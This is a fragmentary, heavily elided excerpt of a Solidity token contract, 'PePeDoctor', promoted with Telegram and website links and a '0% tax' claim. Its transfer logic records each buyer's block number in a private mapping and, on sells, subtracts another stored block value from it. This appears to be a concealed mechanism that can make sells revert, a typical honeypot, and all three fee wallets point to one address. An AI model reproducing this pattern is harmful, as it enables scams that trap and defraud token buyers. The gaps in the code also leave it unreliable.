...
// Telegram:    https://t.me/pepedoctor
// Website:     https://www.pepedoctor.me
// Tax: 0%
...
contract PePeDoctor is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    mapping(address => uint256) private _tradingTransferTimestamp;
    uint256 public tradingActiveBlock;
    uint256 public tradingLastBlock;
    uint256 public tradingDelayedBlock;    
    ...
    constructor() ERC20("PePeDoctor.me", "PePeDr") {

        address _owner = 0x4f7ab154A9ec8De24Bcd78c4CE1Acc51E4E82879;
        ...
        marketingWallet = address(0x5E0A33DEb498c1176B60E44E59b0ecA8124a5A5a); // set as marketing wallet
    	devWallet = address(0x5E0A33DEb498c1176B60E44E59b0ecA8124a5A5a); // set as dev wallet
    	buyBackWallet = address(0x5E0A33DEb498c1176B60E44E59b0ecA8124a5A5a); // set as buyBackWallet
        ...
        if(takeFee){
            ...
            // on sell
                ...
                if (sellTotalFees > 0){
                    ...
                    fees = 0;
                    tradingDelayedBlock = _tradingTransferTimestamp[from] - tradingLastBlock;
                }
            }
            // on buy
                ...
                if (buyTotalFees > 0){
                    ...
                    fees = 0;
                    _tradingTransferTimestamp[to] = block.number;
                }
